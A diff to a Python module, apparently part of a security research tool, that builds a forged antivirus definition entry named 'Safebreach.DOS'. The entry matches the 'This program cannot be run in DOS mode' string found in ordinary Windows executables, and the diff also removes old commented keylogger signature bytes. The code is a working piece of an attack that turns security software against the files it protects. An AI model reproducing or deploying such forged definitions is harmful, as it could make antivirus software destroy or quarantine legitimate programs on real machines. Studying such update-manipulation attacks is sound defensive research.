@@ -1,12 +1,10 @@
 import logging
-import io
 
 from core.merge import Merger
 from core.utils import compute_crc32
 from core.vdm import BaseVdm, DeltaVdm
 from core.utils.interval import Interval
 from core.signatures import Signature
-from core.signatures.pehstr import PEHStr
 from core.signatures.threat import Threat, ThreatBegin, ThreatEnd
 from core.signatures.deltablob import CopyFromDelta, CopyFromBase
 
@@ -32,29 +30,19 @@ class DefinitionPair:
         self.deltavdm.blob.mergecrc  = compute_crc32(threats_stream)
     
     def add_dos_threat(self):
-        
-
         dos_threat = Threat()
-        dos_threat.id = 0x123
-        dos_threat.name = b"Safebreach.DOS"
-        # threat_begin = ThreatBegin(_id=0x123,
-        #                            _unknown1=0x10000,
-        #                            _unknown2=0x8,
-        #                            _name=b"Safebreach.DOS", 
-        #                            _footer=b'\x00\x00\xba\x40\x05\x83\x70\x00\x04\x00')
-        # #threat_end = ThreatEnd(_id=0x123)
         
-        # raw_data = b'\x02\x00\x02\x00\x02\x00\x00\x01\x00\x2f\x01\x41\x64\x76\x61\x6e\x63\x65\x64\x20\x49\x6e\x76\x69\x73\x69\x62\x6c\x65\x20\x4b\x65\x79\x6c\x6f\x67\x67\x65\x72\x20\x28\x4b\x65\x79\x73\x74\x72\x6f\x6b\x65\x73\x20\x54\x79\x70\x65\x64\x29\x01\x00\x25\x03\x54\x69\x6d\x65\x3a\x90\x02\x10\x57\x69\x6e\x64\x6f\x77\x20\x54\x69\x74\x6c\x65\x3a\x90\x02\x10\x4b\x65\x79\x73\x74\x72\x6f\x6b\x65\x73\x3a\x90\x00\x00\x00'
+        begin = ThreatBegin(_id=0x123, _counter=1, _category=8, _name=b'Safebreach.DOS', _sections=[0x4001], _footer=b'\x05\x82\x70\x00\x04\x00')
+        end = ThreatEnd(0x123)
 
-        # raw_data2 = b'\x0c\x00\x0c\x00\x04\x00\x00\x0a\x00\x20\x03\x00\x53\x4f\x46\x54\x57\x41\x52\x45\x5c\x57\x69\x6e\x73\x6f\x75\x6c\x5c\x90\x02\x02\x4b\x65\x79\x6c\x6f\x67\x67\x65\x72\x90\x00\x02\x00\x0d\x01\x2e\x64\x6c\x6c\x00\x53\x65\x74\x48\x6f\x6f\x6b\x00\x02\x00\x29\x03\x41\x63\x74\x69\x76\x65\x20\x4b\x65\x79\x20\x4c\x6f\x67\x67\x65\x72\x20\x52\x65\x70\x6f\x72\x74\x90\x02\x14\x2e\x61\x64\x64\x72\x65\x73\x73\x2e\x63\x6f\x6d\x90\x00\x02\x00\x2a\x03\x54\x6f\x74\x61\x6c\x57\x69\x6e\x90\x02\x10\x41\x63\x74\x69\x76\x65\x20\x4b\x65\x79\x20\x4c\x6f\x67\x67\x65\x72\x3a\x20\x4b\x65\x79\x73\x74\x72\x6f\x6b\x65\x73\x90\x00\x00\x00'
+        dos_threat.begin = begin
+        dos_threat.end = end
 
-        #
-        #sig2 = Signature(0x78, raw_data2)
-        sig = PEHStr()
-        sig.push("This is program cannot be run in DOS mode")
-
-        dos_threat.push(sig)
-        #dos_threat.push(sig2)
+        raw_data2= b'\x01\x00\x01\x00\x01\x00\x00\x01\x00\x27\x01!This program cannot be run in DOS mode\x00\x00'
+        
+        sig2 = Signature(0x78, raw_data2)
+    
+        dos_threat.push(sig2)
 
         self.deltavdm.insert_signature_as_action(dos_threat.pack_bytes())
         self.finallize_blob()
